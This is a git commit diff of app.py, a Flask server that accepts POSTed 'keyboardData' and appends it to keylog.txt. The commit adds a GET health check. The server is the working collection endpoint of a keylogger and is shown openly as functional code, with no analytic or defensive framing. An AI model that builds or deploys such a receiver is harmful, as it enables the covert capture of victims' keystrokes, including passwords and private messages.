b7ed15d7b499780ae09abfdc73908e7b44bb52b4
abzet3 <yahowa.howa@gmail.com>
2024-08-19 17:17:20 +0100

    Update app.py

--- app.py
+++ app.py
@@ -1,19 +1,22 @@
 from flask import Flask, request, jsonify
 
 app = Flask(__name__)
-
-@app.route('/', methods=['POST'])
+@app.route('/', methods=['GET', 'POST'])
 def log_data():
-    try:
-        data = request.json
-        if data and "keyboardData" in data:
-            with open('keylog.txt', 'a') as f:
-                f.write(data['keyboardData'])
-            return jsonify({"status": "success"}), 200
-        else:
-            return jsonify({"status": "no_data"}), 400
-    except Exception as e:
-        return jsonify({"status": "error", "message": str(e)}), 500
+    if request.method == 'GET':
+        return "Server is running!", 200
+    elif request.method == 'POST':
+        try:
+            data = request.json
+            if data and "keyboardData" in data:
+                with open('keylog.txt', 'a') as f:
+                    f.write(data['keyboardData'])
+                return jsonify({"status": "success"}), 200
+            else:
+                return jsonify({"status": "no_data"}), 400
+        except Exception as e:
+            return jsonify({"status": "error", "message": str(e)}), 500
+
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8080)
